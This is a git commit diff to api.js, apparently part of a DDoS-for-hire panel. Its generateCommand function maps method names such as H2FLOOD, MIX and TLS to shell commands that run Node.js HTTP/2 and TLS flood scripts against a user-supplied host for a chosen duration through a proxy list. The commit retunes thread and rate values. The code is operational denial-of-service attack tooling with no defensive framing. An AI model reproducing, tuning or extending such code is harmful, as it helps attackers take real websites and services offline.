d47680efcce1d48510f21442dd3fb55a708ad1cd
Sasaxturu <120617998+Sasaxturu@users.noreply.github.com>
2025-02-24 23:53:16 +0700

    Update api.js

--- api.js
+++ api.js
@@ -30,13 +30,13 @@ const generateCommand = (method, host, port, time) => {
         case 'H2FLASH':
             return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2FLOOD':
-            return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 64 4 proxy.txt`;
+            return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 32 4 proxy.txt`;
         case 'H2MIA':
             return `cd /root/methods && node H2ABIB.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
-            return `cd /root/methods && node Vzy.js ${host} ${time} 64 4 proxy.txt`;
+            return `cd /root/methods && node Vzy.js ${host} ${time} 32 4 proxy.txt`;
         case 'MIX':
-            return `cd /root/methods && node mix.js ${host} ${time} 8 32 proxy.txt -v 1`;
+            return `cd /root/methods && node mix.js ${host} ${time} 4 64 proxy.txt -v 1`;
         case 'TLS':
             return `cd /root/methods && node tls.js ${host} ${time} 64 4 proxy.txt`;
         case 'TLSNET':
